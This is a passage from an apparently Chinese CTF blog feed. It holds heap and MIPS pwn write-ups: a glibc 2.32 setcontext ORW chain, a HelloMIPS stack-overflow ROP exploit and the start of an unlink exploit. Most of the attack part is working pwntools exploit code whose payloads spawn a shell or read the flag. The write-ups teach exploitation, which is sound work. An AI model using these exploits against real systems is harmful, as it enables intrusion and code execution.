operator">^</span>bk_addreditSlogan<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>crypto_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">"/home/shinnosuke/Desktop/pwn/helloheap/flag\x00"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>createTeam<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7</span>deleteTeam<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1\2\9</span><span class="token comment" spellcheck="true"># 0x0000000000124990: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000000277d6</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rsi <span class="token operator">=</span> <span class="token number">0x0000000000032032</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rdx_pop_rbx_ret <span class="token operator">=</span> <span class="token number">0xf48ed</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresssyscall <span class="token operator">=</span> <span class="token number">0x0000000000083445</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspop_rax <span class="token operator">=</span> <span class="token number">0x3efe7</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresscreateTeam<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x124990</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>createTeam<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x580</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4b515</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">15</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x450</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x55555555a580</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">257</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xe40</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>  pop_rax<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xe00</span><span class="token punctuation">,</span>pop_rdx_pop_rbx_ret<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall<span class="token punctuation">,</span>  pop_rax<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xe00</span><span class="token punctuation">,</span>pop_rdx_pop_rbx_ret<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>syscall    <span class="token punctuation">]</span><span class="token punctuation">)</span>createTeam<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9 esp execute ORW 0x55555555a450</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>deleteTeam<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 补充知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> glibc 2.32 </tag>
            
            <tag> 2.31/2.32 setcontext </tag>
            
            <tag> openat </tag>
            
            <tag> safe linking </tag>
            
            <tag> 沙箱绕过 </tag>
            
            <tag> sprintf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS-PWN解题汇总（一）</title>
      <link href="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/"/>
      <url>/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h1><p><strong>TSCTF HelloMIPS</strong>：32位mips栈溢出，rop<br><strong>2020-西湖论剑-management</strong>：32位mips unlink<br><strong>UCTF-2016-ADD</strong>:32位栈溢出，shellcode</p><h1 id="0x01-TSCTF-HelloMIPS"><a href="#0x01-TSCTF-HelloMIPS" class="headerlink" title="0x01 TSCTF HelloMIPS"></a>0x01 TSCTF HelloMIPS</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/0.png"></div>32位mips<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/1.png"></div>程序一开始泄露libc地址<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/2.png"></div>明显栈溢出<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>找gadget执行system(“/bin/sh”)，源程序没有可用的gadgets，从libc中直接找<br>最后定位到这条语句：控制跳转地址以及第一个参数寄存器a0.</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/3.png"></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./HelloMIPS"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib/libc.so.0"</span><span class="token punctuation">)</span><span class="token keyword">global</span> premote_gdb<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/HelloMIPS"</span><span class="token punctuation">,</span> <span class="token string">"./HelloMIPS"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/HelloMIPS"</span><span class="token punctuation">,</span> <span class="token string">"./HelloMIPS"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p<span class="token comment" spellcheck="true"># 0x004007f8 : addiu $sp, $sp, 0x20 ; lw $ra, 0x18($sp) ; nop ; jr $ra ; addiu $sp, $sp, 0x20</span><span class="token comment" spellcheck="true"># 0x00400760 : nop ; jalr $t9 ; addiu $a0, $a0, 0xd20 ; lw $gp, 0x10($sp) ; addiu $v0, $zero, 1 ; sb $v0, 0xe00($s1) ; </span><span class="token comment" spellcheck="true"># lw $ra, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra ; addiu $sp, $sp, 0x28</span><span class="token comment" spellcheck="true"># 0x0000b114: lw $t9, ($sp) ; lw $a0, 4($sp) ; jalr $t9 ; nop</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x440E20</span>p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"MIPSEL.\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"number:0x"</span><span class="token punctuation">)</span>system <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> system <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"system addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000b114</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-2020-西湖论剑-management"><a href="#0x02-2020-西湖论剑-management" class="headerlink" title="0x02 2020-西湖论剑-management"></a>0x02 2020-西湖论剑-management</h1><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/4.png"></div>保护全关，32位的mips题目<h2 id="Ghidra分析程序"><a href="#Ghidra分析程序" class="headerlink" title="Ghidra分析程序"></a>Ghidra分析程序</h2><p>Ghidra软件介绍和安装教程<a href="https://www.secrss.com/articles/8829" target="_blank" rel="noopener">在这</a><br>用来反编译mips比较方便。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/5.png"></div>这是一个传统的菜单堆题，分别有create、show、modify、delete四个功能。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/mips-pwn-jie-ti-hui-zong-yi/6.png"></div>modify的位置有溢出8个字节的漏洞，那么我们很容易就想到利用unlink进行攻击，劫持note_list。<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>在当前chunk中伪造一个0x20的堆块，同时溢出编辑下一个chunk的pre_size和pre_inuse位，这样删除下一个chunk的时候会进行向上合并，触发unlink，最后可以达到劫持note_list的目标。</p><p>写入got表，先打印出libc地址，再劫持free函数为system，delete一个带有“/bin/sh”字符串的chunk即可getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib/libc.so.0"</span><span class="token punctuation">)</span><span class="token keyword">global</span> premote_gdb<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/managesystem"</span><span class="token punctuation">,</span> <span class="token string">"./pwn3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/managesystem"</span><span class="token punctuation">,</span> <span class="token string">"./pwn3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the user info's length:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> sz <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Enter user's info:"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user you want edit:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"The new user's info:"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token 